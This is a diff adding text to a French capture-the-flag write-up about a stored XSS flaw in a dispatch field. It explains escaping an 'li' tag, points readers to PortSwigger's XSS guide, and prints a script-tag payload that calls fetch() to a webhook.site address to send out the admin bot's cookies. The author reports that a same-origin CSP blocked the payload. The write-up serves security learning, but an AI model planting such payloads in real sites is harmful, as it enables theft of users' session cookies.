@@ -28,8 +28,29 @@ Nous pouvons mettre test par exemple pour voir la dépêche reçu.
 
 Essayons de faire une XSS classique pour voir si le champs est vulnérable.
 
+Mais avant tout cela, si vous avez des lacunes aux niveaux des XSS je vous conseilles d'en découvrir plus via ce lien de PortSwigger : 
+https://portswigger.net/web-security/cross-site-scripting
 
+Maintenant regardons si le champs est vulnérable ou non. 
 
+![](../img/Pasted%20image%2020260517141744.png)
+
+Ici le "> permet d'échapper à la balise "li" dans laquelle notre input est mis. 
+![](../img/Pasted%20image%2020260517141834.png)
+
+par la suite on peut mettre du script. Le plus parlant est d'utiliser l'option alert qui vous permet de voir une popup sauf que si vous faite un reload du site vous verrez que cela se ré-exécutera ce qui est un peu troublant.
+
+On sais que le bot admin n'as pas accès à Internet au moment des différents tests cela n'était pas préciser j'avais donc essayer des payload simple et classique tel que : 
+
+```javascript
+"><script>fetch("https://webhook.site/[votre_id]?c=");</script>
+```
+
+Mais maintenant que cela est préciser, cela va me permettre de raccourcie grandement votre temps de lecture au niveau de mon write-up (compte rendu). 
+
+Bon essayons de voir s'il n'y as pas un endpoint qui peut-être intéressant. Car oui nous avons vu qu'il y a une XSS mais qu'on ne peux pas récupérer les cookies du bot admin comme cela puisque cela est filtrer par un CSP de type same origin. 
+
+On peut le voir dans le header. 
 
 Solution finale : 
 
